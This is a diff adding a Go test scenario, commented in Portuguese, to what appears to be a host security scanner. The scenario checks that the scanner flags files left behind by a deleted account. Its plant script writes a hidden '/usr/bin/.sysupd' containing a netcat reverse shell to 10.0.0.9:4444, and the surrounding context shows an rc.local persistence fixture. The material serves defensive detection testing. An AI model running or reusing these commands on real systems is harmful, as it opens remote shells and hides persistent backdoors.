@@ -112,3 +112,52 @@ const rcLocalInerte = `
 printf '#!/bin/sh\n/dev/shm/agent &\nexit 0\n' > /etc/rc.local
 chmod 644 /etc/rc.local
 `
+
+// O outro lado do H1: lá a conta está no passwd e não devia; aqui ela não está
+// e alguma coisa ainda pertence a ela.
+//
+//	J2  conta apagada na faxina, e o arquivo que ficou para trás
+//
+// `userdel` remove a linha. Não toca em disco. Um atacante que criou conta,
+// trabalhou e apagou a conta deixa arquivos cujo uid não traduz para nome
+// nenhum — e é o único aviso que o sistema dá, impresso como número cru no
+// `ls -l` de quem por acaso olhar.
+func init() {
+	Register(Scenario{
+		ID:   "J2-dono-sem-conta",
+		Desc: "conta removida na faxina: o binário que ficou em /usr/bin pertence a um uid que não existe",
+		// Plantado sem `useradd`/`userdel` de propósito: o `chown` numérico é
+		// o que sobra depois da faxina, e é exatamente o estado que a
+		// ferramenta encontra num host de verdade — a conta já foi.
+		//
+		// O dado-só entra junto para provar a OUTRA metade da regra: sem
+		// executável a mesma forma é observação, não achado. É essa distinção
+		// que impede o check de acusar todo volume de contêiner do planeta.
+		Images: matriz,
+		Plant: `printf '#!/bin/sh\nnc -e /bin/sh 10.0.0.9 4444\n' > /usr/bin/.sysupd
+			chmod 755 /usr/bin/.sysupd
+			chown 1337:1337 /usr/bin/.sysupd
+			mkdir -p /srv/dados
+			printf 'dados' > /srv/dados/dump.rdb
+			chown 4242:4242 /srv/dados/dump.rdb`,
+		Expect: []Expect{
+			{ID: "priv.file_owner_no_account", Sev: "CRITICAL", Subject: "uid 1337"},
+			{ID: "priv.file_owner_no_account", Evidence: "/usr/bin/.sysupd"},
+			{ID: "priv.file_owner_no_account", Evidence: "gerenciador de pacotes"},
+			// E o dado-só sai como observação: mesmo uid órfão, outra leitura.
+			{ID: "priv.file_owner_no_account", Sev: "INFO", Subject: "uid 4242"},
+			{ID: "priv.file_owner_no_account", Evidence: "nenhum executável"},
+			// O gid gêmeo é DOBRADO dentro do achado do uid: `chown 1337:1337`
+			// deixa os dois órfãos no mesmo arquivo, e dois achados para um
+			// arquivo diluiriam o crítico num aviso ao lado.
+			{ID: "priv.file_owner_no_account", Evidence: "grupo privado"},
+		},
+		// O passo que separa conta apagada de arquivo importado precisa CHEGAR
+		// ao operador, e ele mora em NextSteps — que Expect não alcança.
+		// -v porque o passo seguinte só é impresso no modo verboso, e é lá que
+		// o operador o encontra.
+		Args:         []string{"-v"},
+		ExpectOutput: []string{"getent passwd 1337"},
+		Exit:         2,
+	})
+}
